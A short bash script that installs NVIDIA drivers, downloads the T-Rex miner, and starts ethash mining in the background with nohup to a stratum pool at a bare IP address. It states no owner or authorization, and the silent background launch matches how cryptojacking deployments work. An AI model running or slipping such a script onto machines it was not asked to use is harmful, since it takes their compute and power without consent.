#!/bin/bash

yes '' | sudo add-apt-repository ppa:graphics-drivers/ppa
sudo apt install -y nvidia-driver-418

wget https://trex-miner.com/download/t-rex-0.24.7-linux.tar.gz
tar -xf t-rex-0.24.7-linux.tar.gz
cd t-rex

tee -a run.sh <<EOF
./t-rex -a ethash -o stratum+http://104.237.202.188:5000
EOF

chmod +x run.sh
nohup sh run.sh > result.txt 2>&1 &


